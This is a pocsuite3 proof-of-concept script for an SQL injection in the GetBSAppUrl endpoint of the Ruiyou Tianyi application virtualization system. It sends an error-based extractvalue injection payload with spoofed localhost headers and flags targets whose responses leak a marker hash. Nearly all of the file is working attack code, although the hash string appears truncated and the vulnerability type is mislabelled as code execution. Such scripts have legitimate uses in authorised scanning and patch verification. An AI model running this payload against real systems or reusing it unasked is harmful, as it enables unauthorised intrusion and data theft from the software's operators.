from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '12341'  # ssvid
    version = '1.0'
    name = '瑞友天翼应用虚拟化系统 GetBSAppUrl SQL 注入'
    appName = '瑞友天翼应用虚拟化系统 GetBSAppUrl SQL 注入'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''sql注入'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/index.php?s=/Agent/GetBSAppUrl/AppID/1'+and+(extractvalue(1,concat(0x7e,(select+md5(10)),0x7e)))+and+'a'='a"
        vulurl = self.url+path
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp = requests.get(url=vulurl,verify = False, allow_redirects = False, timeout=4,headers=headers)
            if resp.status_code==404 and "d3d9446802a44259755d38e6d163e82" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = path
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
